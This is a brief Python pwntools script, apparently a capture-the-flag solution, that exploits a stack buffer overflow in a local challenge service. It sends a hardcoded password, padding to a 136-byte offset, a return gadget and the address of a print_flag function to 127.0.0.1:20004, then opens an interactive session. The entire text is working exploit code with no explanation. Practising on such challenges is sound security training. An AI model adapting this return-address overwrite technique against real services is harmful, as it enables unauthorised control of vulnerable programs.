from pwn import *

print_flag_addr = p64(0x40132c)
ret = p64(0x4013CF)

password = b'3xtr3mely_s3cur3_p4s5word'
offset = 136
padding = b'A' * (offset - len(password) - 8)
payload = password + padding + ret + print_flag_addr


p = remote("127.0.0.1", 20004)
p.recvuntil(b"-> ")
p.sendline(payload)
p.interactive()